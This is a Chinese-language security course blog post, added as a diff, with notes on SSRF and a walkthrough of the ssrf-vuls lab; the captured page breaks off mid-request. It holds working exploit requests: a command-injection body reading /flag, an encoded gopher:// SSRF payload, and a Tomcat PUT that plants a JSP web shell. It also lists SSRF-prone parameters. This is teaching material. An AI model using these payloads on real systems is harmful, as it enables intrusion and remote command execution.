@@ -1,0 +1,726 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"zhigao.xyz","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"livere","storage":true,"lazyload":false,"nav":null,"activeClass":"livere"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta property="og:type" content="article">
+<meta property="og:title" content="第65天-SSRF服务端伪造&amp;伪协议利玩法&amp;域名及IP绕过&amp;无回显利用&amp;挖掘点">
+<meta property="og:url" content="http://zhigao.xyz/2026/09/10/%E7%AC%AC65%E5%A4%A9-SSRF%E6%9C%8D%E5%8A%A1%E7%AB%AF%E4%BC%AA%E9%80%A0-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%8E%A9%E6%B3%95-%E5%9F%9F%E5%90%8D%E5%8F%8AIP%E7%BB%95%E8%BF%87-%E6%97%A0%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8-%E6%8C%96%E6%8E%98%E7%82%B9/index.html">
+<meta property="og:site_name" content="Voyage Memo">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://zhigao.xyz/images/065-1.png">
+<meta property="og:image" content="http://zhigao.xyz/images/065-2.png">
+<meta property="og:image" content="http://zhigao.xyz/images/065-3.png">
+<meta property="og:image" content="http://zhigao.xyz/images/065-4.png">
+<meta property="og:image" content="http://zhigao.xyz/images/065-5.png">
+<meta property="og:image" content="http://zhigao.xyz/images/065-6.png">
+<meta property="og:image" content="http://zhigao.xyz/images/065-7.png">
+<meta property="og:image" content="http://zhigao.xyz/images/065-8.png">
+<meta property="og:image" content="http://zhigao.xyz/images/065-9.png">
+<meta property="og:image" content="http://zhigao.xyz/images/065-10.png">
+<meta property="og:image" content="http://zhigao.xyz/images/065-11.png">
+<meta property="og:image" content="http://zhigao.xyz/images/065-12.png">
+<meta property="og:image" content="http://zhigao.xyz/images/065-13.png">
+<meta property="og:image" content="http://zhigao.xyz/images/065-14.png">
+<meta property="og:image" content="http://zhigao.xyz/images/065-15.png">
+<meta property="og:image" content="http://zhigao.xyz/images/065-16.png">
+<meta property="article:published_time" content="2026-09-10T08:02:35.000Z">
+<meta property="article:modified_time" content="2026-09-10T08:22:34.439Z">
+<meta property="article:author" content="智高">
+<meta property="article:tag" content="笔记">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://zhigao.xyz/images/065-1.png">
+
+<link rel="canonical" href="http://zhigao.xyz/2026/09/10/%E7%AC%AC65%E5%A4%A9-SSRF%E6%9C%8D%E5%8A%A1%E7%AB%AF%E4%BC%AA%E9%80%A0-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%8E%A9%E6%B3%95-%E5%9F%9F%E5%90%8D%E5%8F%8AIP%E7%BB%95%E8%BF%87-%E6%97%A0%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8-%E6%8C%96%E6%8E%98%E7%82%B9/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>第65天-SSRF服务端伪造&伪协议利玩法&域名及IP绕过&无回显利用&挖掘点 | Voyage Memo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Voyage Memo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://zhigao.xyz/2026/09/10/%E7%AC%AC65%E5%A4%A9-SSRF%E6%9C%8D%E5%8A%A1%E7%AB%AF%E4%BC%AA%E9%80%A0-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%8E%A9%E6%B3%95-%E5%9F%9F%E5%90%8D%E5%8F%8AIP%E7%BB%95%E8%BF%87-%E6%97%A0%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8-%E6%8C%96%E6%8E%98%E7%82%B9/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/photo.jpg">
+      <meta itemprop="name" content="智高">
+      <meta itemprop="description" content="正因为我有能力跨越，这个考验才会降临!">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Voyage Memo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          第65天-SSRF服务端伪造&伪协议利玩法&域名及IP绕过&无回显利用&挖掘点
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2026-09-10 16:02:35 / 修改时间：16:22:34" itemprop="dateCreated datePublished" datetime="2026-09-10T16:02:35+08:00">2026-09-10</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-web%E6%94%BB%E9%98%B2/" itemprop="url" rel="index"><span itemprop="name">小迪安全课程学习笔记(web攻防)</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><font></font></p>
+<span id="more"></span>
+
+
+
+<p><font style="color:#ff0000;background-color:#ffff00;">演示案例：</font></p>
+<p><font style="color:#ff0000;background-color:#ffffff;">➢</font><font style="color:#ff0000;background-color:#ffffff;"> </font><font style="color:#ff0000;background-color:#ffffff;">WEB攻防-SSRF利用绕过-伪协议&amp;IP及域名</font></p>
+<p><font style="color:#ff0000;background-color:#ffffff;">➢ WEB攻防-SSRF挖掘思路-功能逻辑&amp;SRC复盘</font></p>
+<p><font style="color:#ff0000;background-color:#ffffff;"></font></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/065-1.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/065-2.png"></p>
+<p><font style="color:#ff0000;background-color:#ffffff;"></font></p>
+<h1 id="一、SSRF漏洞原理"><a href="#一、SSRF漏洞原理" class="headerlink" title="一、SSRF漏洞原理"></a>一、SSRF漏洞原理</h1><p>服务器端请求伪造，也称为SSRF（Server-SideRequestForgery），是因为前端用户可以输入任意URL到后端服务器，而且服务器也没有对其URL进行严格的过滤和校验，导致攻击者可以构造一些恶意的URL让服务器去访问执行。</p>
+<p>主要安全影响<font style="background-color:#DF2A3F;">（这三点在下面靶场都有体现）</font>：</p>
+<p>1、读取服务器本地文件</p>
+<p>2、探测内网存活主机和开放端口</p>
+<p>3、攻击其他内网服务器及服务</p>
+<h1 id="二、靶场-通过靶场来学习攻击其他内网服务器及服务"><a href="#二、靶场-通过靶场来学习攻击其他内网服务器及服务" class="headerlink" title="二、靶场(通过靶场来学习攻击其他内网服务器及服务)"></a>二、靶场(通过靶场来学习攻击其他内网服务器及服务)</h1><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/065-3.png"></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/sqlsec/ssrf-vuls">https://github.com/sqlsec/ssrf-vuls</a></p>
+<h2 id="1、靶场搭建"><a href="#1、靶场搭建" class="headerlink" title="1、靶场搭建"></a>1、靶场搭建</h2><p>环境：Ubuntu 16.04</p>
+<p>命令：</p>
+<p>1.apt update更新软件源</p>
+<p>2.把靶场ssrf-vul-for-new-main.zip上传到linux</p>
+<p>3.apt install unzip下载解压工具，然后解压压缩包</p>
+<p>4.进入目录apt install docker</p>
+<p>5.再apt install docker-compose</p>
+<p>6.docker-compse up -d启动，发现报错了打开docker-compose.yaml把version3改为version2，再次输入一开始命令即可</p>
+<h2 id="2、靶场内容"><a href="#2、靶场内容" class="headerlink" title="2、靶场内容"></a>2、靶场内容</h2><p>通过读取etc下的hosts文件，知道了内网ip，之后我们可以通过遍历ip来发现探测内网存活主机和开放端口。</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/065-4.png"></p>
+<p>接着我们就可以通过bp来实现，这里就不多赘述了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/065-5.png"></p>
+<p>然后就找到了很多服务和主机</p>
+<h3 id="1、http-172-150-23-22"><a href="#1、http-172-150-23-22" class="headerlink" title="1、http://172.150.23.22"></a>1、<a target="_blank" rel="noopener" href="http://172.150.23.22/">http://172.150.23.22</a></h3><p><a target="_blank" rel="noopener" href="http://172.150.23.22/shell.php">http://172.150.23.22/shell.php</a>，通过代码可以看出这里有一个rce</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/065-6.png"></p>
+<p>那么有人问了你怎么知道这里有shell.php，我们还是用bp找个字典包一下就完事了，简单演示一下</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/065-7.png"></p>
+<p>看长度就能发现，这个文件被跑出来了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/065-8.png"></p>
+<p>拿下！</p>
+<h3 id="2、http-172-150-23-24"><a href="#2、http-172-150-23-24" class="headerlink" title="2、http://172.150.23.24"></a>2、<a target="_blank" rel="noopener" href="http://172.150.23.24/">http://172.150.23.24</a></h3><p>这看着也是典型的rce，但是这个我们直接在在这里输入ip是不行的，因为我们是通过一个存在ssrf的网站探测到其他在同一内网的服务，我们必须使用通过存在ssrf的网站去访问其他服务才能通，如果直接在框里输ip和命令，那就是我们主机去访问了，内外网肯定是不通</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/065-9.png"></p>
+<p>我们的框里只能进行get请求，但是<a target="_blank" rel="noopener" href="http://172.150.23.24/">http://172.150.23.24</a>是要post请求，那我们就用用到gopher协议了，先抓一个功能包</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/065-10.png"></p>
+<p>这里host、origin、Referer都要改成内网的ip，然后accept-encoding删掉，因为一会儿涉及到编码，发包发到decoder进行url二次编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST/HTTP/1.1</span><br><span class="line">Host:172.150.23.24</span><br><span class="line">User-Agent:Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:136.0)Gecko/20100101Firefox/136.0</span><br><span class="line">Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language:zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Content-Type:application/x-www-form-urlencoded</span><br><span class="line">Content-Length:26</span><br><span class="line">Origin:http://172.150.23.24</span><br><span class="line">Connection:close</span><br><span class="line">Referer:http://172.150.23.24/</span><br><span class="line">Cookie:timezone=8</span><br><span class="line">Upgrade-Insecure-Requests:1</span><br><span class="line"></span><br><span class="line">ip=127.0.0.1%3Bcat+%2Fflag</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 172.150.23.24</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:154.0) Gecko/20100101 Firefox/154.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 4612</span><br><span class="line">Origin: http://172.150.23.24</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://172.150.23.24/</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br><span class="line"></span><br><span class="line">url=gopher://172.150.23.24:80/_%25%35%30%25%34%66%25%35%33%25%35%34%25%32%30%25%32%66%25%32%30%25%34%38%25%35%34%25%35%34%25%35%30%25%32%66%25%33%31%25%32%65%25%33%31%25%30%64%25%30%61%25%34%38%25%36%66%25%37%33%25%37%34%25%33%61%25%32%30%25%33%31%25%33%37%25%33%32%25%32%65%25%33%31%25%33%35%25%33%30%25%32%65%25%33%32%25%33%33%25%32%65%25%33%32%25%33%34%25%30%64%25%30%61%25%35%35%25%37%33%25%36%35%25%37%32%25%32%64%25%34%31%25%36%37%25%36%35%25%36%65%25%37%34%25%33%61%25%32%30%25%34%64%25%36%66%25%37%61%25%36%39%25%36%63%25%36%63%25%36%31%25%32%66%25%33%35%25%32%65%25%33%30%25%32%30%25%32%38%25%35%37%25%36%39%25%36%65%25%36%34%25%36%66%25%37%37%25%37%33%25%32%30%25%34%65%25%35%34%25%32%30%25%33%31%25%33%30%25%32%65%25%33%30%25%33%62%25%32%30%25%35%37%25%36%39%25%36%65%25%33%36%25%33%34%25%33%62%25%32%30%25%37%38%25%33%36%25%33%34%25%33%62%25%32%30%25%37%32%25%37%36%25%33%61%25%33%31%25%33%35%25%33%34%25%32%65%25%33%30%25%32%39%25%32%30%25%34%37%25%36%35%25%36%33%25%36%62%25%36%66%25%32%66%25%33%32%25%33%30%25%33%31%25%33%30%25%33%30%25%33%31%25%33%30%25%33%31%25%32%30%25%34%36%25%36%39%25%37%32%25%36%35%25%36%36%25%36%66%25%37%38%25%32%66%25%33%31%25%33%35%25%33%34%25%32%65%25%33%30%25%30%64%25%30%61%25%34%31%25%36%33%25%36%33%25%36%35%25%37%30%25%37%34%25%33%61%25%32%30%25%37%34%25%36%35%25%37%38%25%37%34%25%32%66%25%36%38%25%37%34%25%36%64%25%36%63%25%32%63%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%38%25%36%38%25%37%34%25%36%64%25%36%63%25%32%62%25%37%38%25%36%64%25%36%63%25%32%63%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%38%25%36%64%25%36%63%25%33%62%25%37%31%25%33%64%25%33%30%25%32%65%25%33%39%25%32%63%25%32%61%25%32%66%25%32%61%25%33%62%25%37%31%25%33%64%25%33%30%25%32%65%25%33%38%25%30%64%25%30%61%25%34%31%25%36%33%25%36%33%25%36%35%25%37%30%25%37%34%25%32%64%25%34%63%25%36%31%25%36%65%25%36%37%25%37%35%25%36%31%25%36%37%25%36%35%25%33%61%25%32%30%25%37%61%25%36%38%25%32%64%25%34%33%25%34%65%25%32%63%25%37%61%25%36%38%25%33%62%25%37%31%25%33%64%25%33%30%25%32%65%25%33%39%25%32%63%25%37%61%25%36%38%25%32%64%25%35%34%25%35%37%25%33%62%25%37%31%25%33%64%25%33%30%25%32%65%25%33%38%25%32%63%25%37%61%25%36%38%25%32%64%25%34%38%25%34%62%25%33%62%25%37%31%25%33%64%25%33%30%25%32%65%25%33%37%25%32%63%25%36%35%25%36%65%25%32%64%25%35%35%25%35%33%25%33%62%25%37%31%25%33%64%25%33%30%25%32%65%25%33%36%25%32%63%25%36%35%25%36%65%25%33%62%25%37%31%25%33%64%25%33%30%25%32%65%25%33%35%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%35%34%25%37%39%25%37%30%25%36%35%25%33%61%25%32%30%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%38%25%32%64%25%37%37%25%37%37%25%37%37%25%32%64%25%36%36%25%36%66%25%37%32%25%36%64%25%32%64%25%37%35%25%37%32%25%36%63%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35%25%36%34%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%34%63%25%36%35%25%36%65%25%36%37%25%37%34%25%36%38%25%33%61%25%32%30%25%33%32%25%33%36%25%30%64%25%30%61%25%34%66%25%37%32%25%36%39%25%36%37%25%36%39%25%36%65%25%33%61%25%32%30%25%36%38%25%37%34%25%37%34%25%37%30%25%33%61%25%32%66%25%32%66%25%33%31%25%33%37%25%33%32%25%32%65%25%33%31%25%33%35%25%33%30%25%32%65%25%33%32%25%33%33%25%32%65%25%33%32%25%33%34%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%36%65%25%36%35%25%36%33%25%37%34%25%36%39%25%36%66%25%36%65%25%33%61%25%32%30%25%36%33%25%36%63%25%36%66%25%37%33%25%36%35%25%30%64%25%30%61%25%35%32%25%36%35%25%36%36%25%36%35%25%37%32%25%36%35%25%37%32%25%33%61%25%32%30%25%36%38%25%37%34%25%37%34%25%37%30%25%33%61%25%32%66%25%32%66%25%33%31%25%33%37%25%33%32%25%32%65%25%33%31%25%33%35%25%33%30%25%32%65%25%33%32%25%33%33%25%32%65%25%33%32%25%33%34%25%32%66%25%30%64%25%30%61%25%35%35%25%37%30%25%36%37%25%37%32%25%36%31%25%36%34%25%36%35%25%32%64%25%34%39%25%36%65%25%37%33%25%36%35%25%36%33%25%37%35%25%37%32%25%36%35%25%32%64%25%35%32%25%36%35%25%37%31%25%37%35%25%36%35%25%37%33%25%37%34%25%37%33%25%33%61%25%32%30%25%33%31%25%30%64%25%30%61%25%35%30%25%37%32%25%36%39%25%36%66%25%37%32%25%36%39%25%37%34%25%37%39%25%33%61%25%32%30%25%37%35%25%33%64%25%33%30%25%32%63%25%32%30%25%36%39%25%30%64%25%30%61%25%30%64%25%30%61%25%36%39%25%37%30%25%33%64%25%33%31%25%33%32%25%33%37%25%32%65%25%33%30%25%32%65%25%33%30%25%32%65%25%33%31%25%32%35%25%33%33%25%34%32%25%36%33%25%36%31%25%37%34%25%32%62%25%32%35%25%33%32%25%34%36%25%36%36%25%36%63%25%36%31%25%36%37</span><br></pre></td></tr></table></figure>
+
+<p>结果出现flag，拿下！</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/065-11.png"></p>
+<p>#SSRF漏洞挖掘</p>
+<p>黑盒探针：</p>
+<p>-业务功能点</p>
+<p>1.社交分享功能：获取超链接的标题等内容进行显示</p>
+<p>2.转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</p>
+<p>3.在线翻译：给网址翻译对应网页的内容</p>
+<p>4.图片加载&#x2F;下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</p>
+<p>5.图片&#x2F;文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</p>
+<p>6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</p>
+<p>7.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</p>
+<p>8.数据库内置功能：数据库的比如mongodb的copyDatabase函数</p>
+<p>9.邮件系统：比如接收邮件服务器地址</p>
+<p>10.编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</p>
+<p>11.未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞</p>
+<p>-URL关键参数</p>
+<p>share</p>
+<p>wap</p>
+<p>url</p>
+<p>link</p>
+<p>src</p>
+<p>source</p>
+<p>target</p>
+<p>u</p>
+<p>display</p>
+<p>sourceURl</p>
+<p>imageURL</p>
+<p>domain</p>
+<p>白盒分析：见代码审计（文件读取，加载，数据操作类的函数）</p>
+<h3 id="3、http-172-150-23-26-8080"><a href="#3、http-172-150-23-26-8080" class="headerlink" title="3、http://172.150.23.26:8080"></a>3、<a target="_blank" rel="noopener" href="http://172.150.23.26:8080/">http://172.150.23.26:8080</a></h3><p>这个网站下有一个tomcat的网站，这里利用需要给服务器发一个put包，所以这里还是需要需要利用gopher去发包，这里只用来理解ssrf具体这个漏洞这里不用管。</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/065-12.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/065-13.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">PUT /1.jsp/ HTTP/1.1</span><br><span class="line">Host: 172.150.23.26:8080</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 460</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    String command = request.getParameter(&quot;cmd&quot;);</span><br><span class="line">    if(command != null)</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.InputStream in=Runtime.getRuntime().exec(command).getInputStream();</span><br><span class="line">        int a = -1;</span><br><span class="line">        byte[] b = new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a=in.read(b))!=-1)</span><br><span class="line">        &#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        out.print(&quot;format: xxx.jsp?cmd=Command&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 8.217.100.43:9080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:154.0) Gecko/20100101 Firefox/154.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 6315</span><br><span class="line">Origin: http://8.217.100.43:9080</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://8.217.100.43:9080/</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br><span class="line"></span><br><span 